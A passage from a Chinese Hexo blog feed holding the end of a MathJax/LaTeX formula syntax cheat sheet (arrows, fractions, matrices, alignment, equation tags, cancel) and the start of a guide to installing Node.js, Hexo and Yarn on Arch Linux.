</tr>
<tr>
<td style="text-align:center"><code>\tilde&#123;xy&#125;</code></td>
<td style="text-align:center">$\tilde{xy}$</td>
<td style="text-align:center"><code>\widetilde&#123;xyz&#125;</code></td>
<td style="text-align:center">$\widetilde{xyz}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\check&#123;x&#125;</code></td>
<td style="text-align:center">$\check{x}$</td>
<td style="text-align:center"><code>\breve&#123;y&#125;</code></td>
<td style="text-align:center">$\breve{y}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\grave&#123;x&#125;</code></td>
<td style="text-align:center">$\grave{x}$</td>
<td style="text-align:center"><code>\acute&#123;y&#125;</code></td>
<td style="text-align:center">$\acute{y}$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="连线"><a href="#连线" class="headerlink" title="连线"></a>连线</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\fbox&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\fbox{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\overleftarrow&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\overleftarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\overrightarrow&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\overrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\overleftrightarrow&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\overleftrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\underleftarrow&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\underleftarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\underrightarrow&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\underrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\underleftrightarrow&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\underleftrightarrow{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\overline&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\overline{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\underline&#123;a+b+c+d&#125;</code></td>
<td style="text-align:center">$\underline{a+b+c+d}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\overbrace&#123;a+b+c+d&#125;^&#123;Sample&#125;</code></td>
<td style="text-align:center">$\overbrace{a+b+c+d}^{Sample}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\underbrace&#123;a+b+c+d&#125;_&#123;Sample&#125;</code></td>
<td style="text-align:center">$\underbrace{a+b+c+d}_{Sample}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\overbrace&#123;a+\underbrace&#123;b+c&#125;_&#123;1.0&#125;+d&#125;^&#123;2.0&#125;</code></td>
<td style="text-align:center">$\overbrace{a+\underbrace{b+c}_{1.0}+d}^{2.0}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\underbrace&#123;a\cdot a\cdots a&#125;_&#123;b\text&#123; times&#125;&#125;</code></td>
<td style="text-align:center">$\underbrace{a\cdot a\cdots a}_{b\text{ times}}$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="箭头符号"><a href="#箭头符号" class="headerlink" title="箭头符号"></a>箭头符号</h4><ul>
<li>常用：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\implies</code></td>
<td style="text-align:center">$\implies$</td>
<td style="text-align:center"><code>\iff</code></td>
<td style="text-align:center">$\iff$</td>
<td style="text-align:center"><code>\impliedby</code></td>
<td style="text-align:center">$\impliedby$</td>
</tr>
<tr>
<td style="text-align:center"><code>\to</code></td>
<td style="text-align:center">$\to$</td>
<td style="text-align:center"><code>\mapsto</code></td>
<td style="text-align:center">$\mapsto$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>其它可用符号：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\uparrow</code></td>
<td style="text-align:center">$\uparrow$</td>
<td style="text-align:center"><code>\Uparrow</code></td>
<td style="text-align:center">$\Uparrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\downarrow</code></td>
<td style="text-align:center">$\downarrow$</td>
<td style="text-align:center"><code>\Downarrow</code></td>
<td style="text-align:center">$\Downarrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\leftarrow</code></td>
<td style="text-align:center">$\leftarrow$</td>
<td style="text-align:center"><code>\Leftarrow</code></td>
<td style="text-align:center">$\Leftarrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\rightarrow</code></td>
<td style="text-align:center">$\rightarrow$</td>
<td style="text-align:center"><code>\Rightarrow</code></td>
<td style="text-align:center">$\Rightarrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\leftrightarrow</code></td>
<td style="text-align:center">$\leftrightarrow$</td>
<td style="text-align:center"><code>\Leftrightarrow</code></td>
<td style="text-align:center">$\Leftrightarrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\longleftarrow</code></td>
<td style="text-align:center">$\longleftarrow$</td>
<td style="text-align:center"><code>\Longleftarrow</code></td>
<td style="text-align:center">$\Longleftarrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\longrightarrow</code></td>
<td style="text-align:center">$\longrightarrow$</td>
<td style="text-align:center"><code>\Longrightarrow</code></td>
<td style="text-align:center">$\Longrightarrow$</td>
</tr>
<tr>
<td style="text-align:center"><code>\longleftrightarrow</code></td>
<td style="text-align:center">$\longleftrightarrow$</td>
<td style="text-align:center"><code>\Longleftrightarrow</code></td>
<td style="text-align:center">$\Longleftrightarrow$</td>
</tr>
</tbody>
</table>
</div>
<h2 id="分、根式"><a href="#分、根式" class="headerlink" title="分、根式"></a>分、根式</h2><ul>
<li><code>\frac&#123;&#125;&#123;&#125;</code>     :分式</li>
<li><code>\sqrt[]&#123;&#125;</code>     :根式</li>
</ul>
<p><strong>使用<code>\!</code>减少距离，使其公式更美观</strong></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$\frac&#123;分子&#125;&#123;分母&#125;$</span><br><span class="line"></span><br><span class="line">$\frac&#123;x+y&#125;&#123;2&#125;$</span><br><span class="line"></span><br><span class="line">$\frac&#123;1&#125;&#123;1+\frac&#123;1&#125;&#123;2&#125;&#125;$</span><br><span class="line"></span><br><span class="line">$\sqrt[根指数]&#123;根底数&#125;$</span><br><span class="line"></span><br><span class="line">$\sqrt&#123;2&#125;&lt;\sqrt[3]&#123;3&#125;$</span><br><span class="line"></span><br><span class="line">$\sqrt&#123;1+\sqrt[p]&#123;1+a^2&#125;&#125;$</span><br><span class="line"></span><br><span class="line">$abc$ 比较 $a\!bc$</span><br><span class="line">$\frac&#123;1&#125;&#123;2&#125;$ 比较 $\frac&#123;1&#125;&#123;2^&#123;&#125;&#125;$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\sqrt&#123;1+\sqrt[^p\!]&#123;1+a^2&#125;&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<p>$\frac{分子}{分母}$</p>
<p>$\frac{x+y}{2}$</p>
<p>$\frac{1}{1+\frac{1}{2}}$</p>
<p>$\sqrt[根指数]{根底数}$</p>
<p>$\sqrt{2}&lt;\sqrt[3]{3}$</p>
<p>$\sqrt{1+\sqrt[p]{1+a^2}}$</p>
<p><strong>Kramed对部分行间插入不兼容</strong></p>
<p>$abc$ 对比 $a!bc$</p>
<script type="math/tex; mode=display">
\sqrt{1+\sqrt[^p\! ]{1+a^2}}</script><hr>
<h2 id="求和、积、极限、积分"><a href="#求和、积、极限、积分" class="headerlink" title="求和、积、极限、积分"></a>求和、积、极限、积分</h2><ul>
<li><code>\sum</code>         :求和</li>
<li><code>\prod</code>         :积</li>
<li><code>\lim</code>         :极限</li>
<li><code>\int</code>         :积分，多重积分使用如下形式<code>`\int</code>、<code>\iint</code>、<code>\iiint</code>、<code>\iiiint</code>、<code>\idotsint</code></li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$\sum_&#123;i&#x3D;1&#125;^n&#123;a_i&#125;$</span><br><span class="line"></span><br><span class="line">$\sum_&#123;k&#x3D;1&#125;^&#123;n&#125;\frac&#123;1&#125;&#123;k&#125;$</span><br><span class="line"></span><br><span class="line">$\sum_&#123;k&#x3D;1&#125;^n\frac&#123;1&#125;&#123;k&#125;$</span><br><span class="line"></span><br><span class="line">$\prod_&#123;i&#x3D;1&#125;^n \frac&#123;1&#125;&#123;i^2&#125;$</span><br><span class="line"></span><br><span class="line">$\lim_&#123;x\to 0&#125;$</span><br><span class="line"></span><br><span class="line">$\int_0^xf(x)dx$</span><br><span class="line"></span><br><span class="line">$\int_a^b f(x)dx$</span><br><span class="line"></span><br><span class="line">$\int_a^b f(x)dx$</span><br><span class="line"></span><br><span class="line">多重积分</span><br><span class="line">$\int\int\quad \int\int\int\quad\int\int\int\int\quad \int\dots\int$</span><br><span class="line"></span><br><span class="line">$\iint\quad \iiint\quad \iiiint\quad \idotsint$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<p>$\sum_{i=1}^n{a_i}$</p>
<p>$\sum_{k=1}^{n}\frac{1}{k}$</p>
<p>$\sum_{k=1}^n\frac{1}{k}$</p>
<p>$\prod_{i=1}^n \frac{1}{i^2}$</p>
<p>$\lim_{n \to +\infty}\frac{1}{n(n+1)}$</p>
<p>$\int_0^xf(x)dx$</p>
<p>$\int_a^b f(x)dx$</p>
<p>$\int_a^b f(x)dx$</p>
<p>$\int\int\quad \int\int\int\quad\int\int\int\int\quad \int\dots\int$</p>
<p>$\iint\quad \iiint\quad \iiiint\quad \idotsint$</p>
<hr>
<h2 id="方程组、分段函数"><a href="#方程组、分段函数" class="headerlink" title="方程组、分段函数"></a>方程组、分段函数</h2><p><strong>用到<code>cases</code>环境</strong>，<code>\begin&#123;cases&#125;</code> :起始     <code>\end&#123;cases&#125;</code> :结束</p>
<ul>
<li><strong>每行结束用<code>\\</code>标记</strong></li>
<li><strong>行间元素以<code>&amp;</code>分隔</strong></li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">方程组：</span><br><span class="line">$$</span><br><span class="line">a_1x+b_1y+c_1z&#x3D;d_1\\</span><br><span class="line">a_2x+b_2y+c_2z&#x3D;d_2\\</span><br><span class="line">a_3x+b_3y+c_3z&#x3D;d_3\\</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">分段函数：</span><br><span class="line">$$</span><br><span class="line">y&#x3D;\begin&#123;cases&#125;</span><br><span class="line">-x,&amp;x\leq 0 \\</span><br><span class="line">x,\quad x&gt;0</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<p>方程组：</p>
<script type="math/tex; mode=display">
a_1x+b_1y+c_1z=d_1\\
a_2x+b_2y+c_2z=d_2\\
a_3x+b_3y+c_3z=d_3\\</script><p>分段函数：</p>
<script type="math/tex; mode=display">
y=\begin{cases}
-x,&x\leq 0 \\
x,\quad x>0
\end{cases}</script><hr>
<h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><ul>
<li><p>矩阵边框环境</p>
<ul>
<li><code>pmatrix</code>：小括号<code>()</code>边框</li>
<li><code>bmatrix</code>：中括号<code>[]</code>边框</li>
<li><code>Bmatrix</code>：大括号<code>&#123;&#125;</code>边框</li>
<li><code>vmatrix</code>：单竖线<code>|</code>边框</li>
<li><code>Vmatrix</code>：双竖线<code>‖</code>边框</li>
</ul>
</li>
<li><p><code>\begin&#123;边框环境&#125;</code>     :起始标记</p>
</li>
<li><code>\end&#123;边框环境&#125;</code>         :结束标记</li>
<li><strong>每行结束用<code>\\</code>标记</strong></li>
<li><strong>行间元素以<code>&amp;</code>分隔</strong></li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;matrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;matrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;pmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;pmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;bmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;bmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$\begin&#123;Bmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;Bmatrix&#125;$$</span><br><span class="line"></span><br><span class="line">$$\begin&#123;vmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;vmatrix&#125;$$</span><br><span class="line"></span><br><span class="line">$$\left|\begin&#123;matrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;matrix&#125;\right|$$</span><br><span class="line"></span><br><span class="line">$$\begin&#123;Vmatrix&#125;1 &amp; 2\\</span><br><span class="line">3 &amp;4\end&#123;Vmatrix&#125;$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>（注意差别）

$$
\begin{matrix}1 & 2\\
3 &4\end{matrix}
$$

$$
\begin{pmatrix}1 & 2\\
3 &4\end{pmatrix}
$$


$$
\begin{bmatrix}1 & 2\\
3 &4\end{bmatrix}
$$

$$\begin{Bmatrix}1 & 2\\
3 &4\end{Bmatrix}$$

$$\begin{vmatrix}1 & 2\\
3 &4\end{vmatrix}$$

$$\left|\begin{matrix}1 & 2\\
3 &4\end{matrix}\right|$$

$$\begin{Vmatrix}1 & 2\\
3 &4\end{Vmatrix}$$

-----



### 带省略号的矩阵

<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\mathbf&#123;X&#125; &#x3D; </span><br><span class="line">\begin&#123;bmatrix&#125;</span><br><span class="line">&#123;a_&#123;11&#125;&#125;&amp;&#123;a_&#123;12&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;1n&#125;&#125;\\</span><br><span class="line">&#123;a_&#123;21&#125;&#125;&amp;&#123;a_&#123;22&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;2n&#125;&#125;\\</span><br><span class="line">&#123;\vdots&#125;&amp;&#123;\vdots&#125;&amp;&#123;\ddots&#125;&amp;&#123;\vdots&#125;\\</span><br><span class="line">&#123;a_&#123;m1&#125;&#125;&amp;&#123;a_&#123;m2&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;mn&#125;&#125;\\</span><br><span class="line">\end&#123;bmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

-----

<font color="#FF0000"> **效果:** </font>

<script type="math/tex; mode=display">
\mathbf{X} = 
\begin{bmatrix}
{a_{11}}&{a_{12}}&{\cdots}&{a_{1n}}\\
{a_{21}}&{a_{22}}&{\cdots}&{a_{2n}}\\
{\vdots}&{\vdots}&{\ddots}&{\vdots}\\
{a_{m1}}&{a_{m2}}&{\cdots}&{a_{mn}}\\
\end{bmatrix}</script><hr>
<h3 id="带分割符号的矩阵"><a href="#带分割符号的矩阵" class="headerlink" title="带分割符号的矩阵"></a>带分割符号的矩阵</h3><h2 id="数组排列、表格"><a href="#数组排列、表格" class="headerlink" title="数组排列、表格"></a>数组排列、表格</h2><p><strong>通过<code>\begin</code>、<code>\end</code>的环境来实现</strong></p>
<ul>
<li><p><strong><code>array</code> 环境主要用于数组矩阵的排版，同时也能做表格</strong></p>
<p><code>&#123;array&#125;&#123;|l|c|r|&#125;</code> :数组环境，加<code>|</code>为列加竖线</p>
<ul>
<li><code>|</code>             :竖线</li>
<li><code>l</code> 居左) 、<code>c</code> (居中) 、<code>r</code> (居右)</li>
<li><code>\hline</code>         :横线</li>
<li><code>&amp;</code>             :分列</li>
<li><code>\\</code>             :换行</li>
</ul>
</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\mathbf&#123;X&#125; &#x3D;</span><br><span class="line">\left( \begin&#123;array&#125;&#123;ccc&#125;</span><br><span class="line">x\_&#123;11&#125; &amp; x\_&#123;12&#125; &amp; \ldots \\</span><br><span class="line">x\_&#123;21&#125; &amp; x\_&#123;22&#125; &amp; \ldots \\</span><br><span class="line">\vdots &amp; \vdots &amp; \ddots</span><br><span class="line">\end&#123;array&#125; \right)</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">表格式数组</span><br><span class="line">$$</span><br><span class="line">\begin&#123;array&#125;&#123;c|lcr&#125;</span><br><span class="line">n &amp; \text&#123;Left&#125; &amp; \text&#123;Center&#125; &amp; \text&#123;Right&#125; \\</span><br><span class="line">\hline</span><br><span class="line">1 &amp; 0.24 &amp; 1 &amp; 125 \\</span><br><span class="line">2 &amp; -1 &amp; 189 &amp; -8 \\</span><br><span class="line">3 &amp; -20 &amp; 2000 &amp; 1+10i</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">表格</span><br><span class="line">$$</span><br><span class="line">\left(\begin&#123;array&#125;&#123;|c|c|&#125;</span><br><span class="line"> 1 &amp; 2 \\</span><br><span class="line">\hline</span><br><span class="line"> 3 &amp; 4</span><br><span class="line">\end&#123;array&#125;\right)</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;array&#125;&#123;|l|c|r|&#125;</span><br><span class="line">\hline</span><br><span class="line"> 操作系统&amp; 发行版&amp; 编辑器\\</span><br><span class="line">\hline</span><br><span class="line"> Windows &amp; MikTeX &amp; TexMakerX\\</span><br><span class="line">\hline</span><br><span class="line"> Unix&#x2F;Linux &amp; teTeX &amp; Kile\\</span><br><span class="line">\hline</span><br><span class="line"> Mac OS &amp; MacTeX &amp; TeXShop\\</span><br><span class="line">\hline</span><br><span class="line"> 通用&amp; TeX Live &amp; TeXworks\\</span><br><span class="line">\hline</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<script type="math/tex; mode=display">
\mathbf{X} =
\left( \begin{array}{ccc}
x\_{11} & x\_{12} & \ldots \\
x\_{21} & x\_{22} & \ldots \\
\vdots & \vdots & \ddots
\end{array} \right)</script><p>表格式数组</p>
<script type="math/tex; mode=display">
\begin{array}{c|lcr}
n & \text{Left} & \text{Center} & \text{Right} \\
\hline
1 & 0.24 & 1 & 125 \\
2 & -1 & 189 & -8 \\
3 & -20 & 2000 & 1+10i
\end{array}</script><p>表格</p>
<script type="math/tex; mode=display">
\left(\begin{array}{|c|c|}
 1 & 2 \\
\hline
 3 & 4
\end{array}\right)</script><script type="math/tex; mode=display">
\begin{array}{|l|c|r|}
\hline
 操作系统& 发行版& 编辑器\\
\hline
 Windows & MikTeX & TexMakerX\\
\hline
 Unix/Linux & teTeX & Kile\\
\hline
 Mac OS & MacTeX & TeXShop\\
\hline
 通用& TeX Live & TeXworks\\
\hline
\end{array}</script><hr>
<h2 id="长公式"><a href="#长公式" class="headerlink" title="长公式"></a>长公式</h2><p><strong>有些公式太长可其进行换行处理，通过<code>\begin</code>、<code>\end</code>的环境来实现</strong></p>
<ul>
<li><code>aligned</code>     :对齐环境</li>
<li><code>multline</code>     :多行(不对齐)环境</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">不对齐</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;multline&#125;</span><br><span class="line">x &#x3D; a+b+c+\\</span><br><span class="line">d+e+f+g</span><br><span class="line">\end&#123;multline&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">对齐</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;aligned&#125;</span><br><span class="line">x &#x3D; a+b+c+\\</span><br><span class="line">d+e+f+g</span><br><span class="line">\end&#123;aligned&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<p><strong>不对齐</strong></p>
<script type="math/tex; mode=display">
\begin{multline}
x = a+b+c+{} \\
d+e+f+g
\end{multline}</script><p><strong>对齐</strong></p>
<script type="math/tex; mode=display">
\begin{aligned}
x ={}& a+b+c+{} \\
&d+e+f+g
\end{aligned}</script><hr>
<h2 id="公式组"><a href="#公式组" class="headerlink" title="公式组"></a>公式组</h2><p><strong>通过<code>\begin</code>、<code>\end</code>的环境来实现</strong></p>
<ul>
<li><code>gather</code>         :不对齐(居中)环境</li>
<li><code>align</code>         :对齐1环境</li>
<li><code>eqnarray</code>     :对齐2环境</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">不对对齐(居中)</span><br><span class="line">$$</span><br><span class="line">\begin&#123;gather&#125;</span><br><span class="line">a &#x3D; b+c+d \\</span><br><span class="line">x &#x3D; y+z</span><br><span class="line">\end&#123;gather&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">对齐1</span><br><span class="line">$$</span><br><span class="line">\begin&#123;align&#125;</span><br><span class="line">a &#x3D; b+c+d \\</span><br><span class="line">x &#x3D; y+z</span><br><span class="line">\end&#123;align&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">对齐2</span><br><span class="line">$$</span><br><span class="line">\begin&#123;eqnarray&#125;</span><br><span class="line">x+y &#x3D; z\\</span><br><span class="line">a&#x3D;4</span><br><span class="line">\end&#123;eqnarray&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<p>不对齐</p>
<script type="math/tex; mode=display">
\begin{gather}
a = b+c+d \\
x = y+z
\end{gather}</script><p>对齐1</p>
<script type="math/tex; mode=display">
\begin{align}
a = b+c+d \\
x = y+z
\end{align}</script><p>对齐2</p>
<script type="math/tex; mode=display">
\begin{eqnarray}
x+y = z
\\a=4
\end{eqnarray}</script><hr>
<h2 id="公式编号"><a href="#公式编号" class="headerlink" title="公式编号"></a>公式编号</h2><ul>
<li><code>&#123;align&#125;</code> 编号环境<ul>
<li><code>\tag&#123;n&#125;</code> 加在公式后用于给公式编号，<strong>可在环境外单独使用但只能一个,有些编辑器中<code>align</code>能自动编号</strong><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">f(x)&#x3D;x+3\tag&#123;1&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;align&#125;</span><br><span class="line">\sqrt&#123;37&#125; &amp; &#x3D; \sqrt&#123;\frac&#123;73^2-1&#125;&#123;12^2&#125;&#125; \tag&#123;1&#125;\\</span><br><span class="line"> &amp; &#x3D; \sqrt&#123;\frac&#123;73^2&#125;&#123;12^2&#125;\cdot\frac&#123;73^2-1&#125;&#123;73^2&#125;&#125; \tag&#123;2&#125;\\</span><br><span class="line"> &amp; &#x3D; \sqrt&#123;\frac&#123;73^2&#125;&#123;12^2&#125;&#125;\sqrt&#123;\frac&#123;73^2-1&#125;&#123;73^2&#125;&#125; \tag 3\\</span><br><span class="line"> &amp; &#x3D; \frac&#123;73&#125;&#123;12&#125;\sqrt&#123;1 - \frac&#123;1&#125;&#123;73^2&#125;&#125; \tag 4\\ </span><br><span class="line"> &amp; \approx \frac&#123;73&#125;&#123;12&#125;\left(1 - \frac&#123;1&#125;&#123;2\cdot73^2&#125;\right)\tag 5</span><br><span class="line">\end&#123;align&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<hr>
<font color="#FF0000"> **效果:** </font>

<script type="math/tex; mode=display">
f(x)=x+3\\\tag{1}</script><script type="math/tex; mode=display">
\begin{align}
\sqrt{37} & = \sqrt{\frac{73^2-1}{12^2}} \tag{1}\\
 & = \sqrt{\frac{73^2}{12^2}\cdot\frac{73^2-1}{73^2}} \tag{2}\\
 & = \sqrt{\frac{73^2}{12^2}}\sqrt{\frac{73^2-1}{73^2}} \tag 3\\
 & = \frac{73}{12}\sqrt{1 - \frac{1}{73^2}} \tag 4\\ 
 & \approx \frac{73}{12}\left(1 - \frac{1}{2\cdot73^2}\right)\tag 5
\end{align}</script><hr>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><p><strong>使用删除线功能必须用 $$$$ </strong></p>
<p>在公式内使用 <code>\require&#123;cancel&#125;</code> 来允许 <strong>片段删除线</strong> 的显示。<br>声明片段删除线后，使用 <code>\cancel&#123;字符&#125;</code>、<code>\bcancel&#123;字符&#125;</code>、<code>\xcancel&#123;字符&#125;</code> 和 <code>\cancelto&#123;字符&#125;</code> 来实现各种片段删除线效果</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\require&#123;cancel&#125;\begin&#123;array&#125;&#123;rl&#125;</span><br><span class="line">y+\cancel&#123;x&#125;\\</span><br><span class="line">\cancel&#123;y+x&#125;\\</span><br><span class="line">y+\bcancel&#123;x&#125;\\</span><br><span class="line">y+\xcancel&#123;x&#125;\\</span><br><span class="line">y+\cancelto&#123;0&#125;&#123;x&#125;\\</span><br><span class="line">\frac&#123;1\times\cancel9&#125;&#123;\cancel9\times5&#125; &#x3D; \frac15 \\</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000">**效果:**</font>

<script type="math/tex; mode=display">
\require{cancel}\begin{array}{rl}
y+\cancel{x}\\
\cancel{y+x}\\
y+\bcancel{x}\\
y+\xcancel{x}\\
y+\cancelto{0}{x}\\
\frac{1\times\cancel9}{\cancel9\times5} = \frac15 \\
\end{array}</script><hr>
<p>参考：</p>
<p><a href="https://www.zybuluo.com/codeep/note/163962">Cmd Markdown 公式指导手册</a> (相对系统官方)</p>
<p><a href="https://juejin.im/post/5a6721bd518825733201c4a2">MarkDown 插入数学公式实验大集合</a></p>
<p><a href="https://oysz2016.github.io/post/8611e6fb.html">数学公式语法——Mathjax教程</a></p>
<p><a href="https://www.caam.rice.edu/~heinken/latex/symbols.pdf">莱斯大学 LaTex数学符号表</a></p>
]]></content>
      <categories>
        <category>LaTex</category>
      </categories>
      <tags>
        <tag>MathJax</tag>
        <tag>LaTex</tag>
        <tag>Markdown</tag>
        <tag>坑</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux上搭建Hexo博客</title>
    <url>/posts/ab83f943/</url>
    <content><![CDATA[<h2 id="Linux-上搭建Hexo博客"><a href="#Linux-上搭建Hexo博客" class="headerlink" title="Linux 上搭建Hexo博客"></a>Linux 上搭建Hexo博客</h2><h3 id="在本地搭建"><a href="#在本地搭建" class="headerlink" title="在本地搭建"></a>在本地搭建</h3><h4 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h4><p>（archlinux发行版及其衍生版上，其他版本可用相关的软件包管理工具进行安装，如：yum apt-get，也可到官网下载安装包进行安装）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nodejs</span><br><span class="line"><span class="comment">#项目出现TypeError [ERR_INVALID_ARG_TYPE]错误时降级安装nodejs-lts-erbium node12长期支持版</span></span><br><span class="line"></span><br><span class="line">node -v</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>（archlinux发行版及其衍生版上，其他版本可先安装npm包管理工具，再用npm来安装hexo）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay nodejs-hexo	<span class="comment">#安装时一路回车就行，npm等几个软件包可选不删除，这里推荐使用yarn代替npm</span></span><br><span class="line"><span class="comment">#若安装hexo后删除了npm，需要用npm的自行安装即可: sudo pacman -S npm</span></span><br><span class="line">sudo pacman -S yarn</span><br><span class="line">hexo -v</span><br><span class="line">yarn -v</span><br><span class="line"><span class="comment">#npm -v</span></span><br><span class="line">yarn config <span class="built_in">set</span> prefix /usr/<span class="built_in">local</span>	<span class="comment">#修改全局安装路径,修改后如进行全局安装时就需要加sudo</span></span><br><span class="line"><span class="comment">#或添加环境变量：</span></span><br><span class="line"><span class="comment">#bash ：export PATH=&quot;$(yarn global bin):$PATH&quot;</span></span><br><span class="line"><span class="comment">#fish ： vim ~/.config/fish/config.fish  #加入： set PATH (yarn global bin) $PATH</span></span><br></pre></td></tr></table></figure>
<p><strong>yarn与npm命令替换</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">npm (v5)</th>
<th style="text-align:left">Yarn</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>npm install [package] --save</code></td>
<td style="text-align:left"><code>yarn add [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --save-dev</code></td>
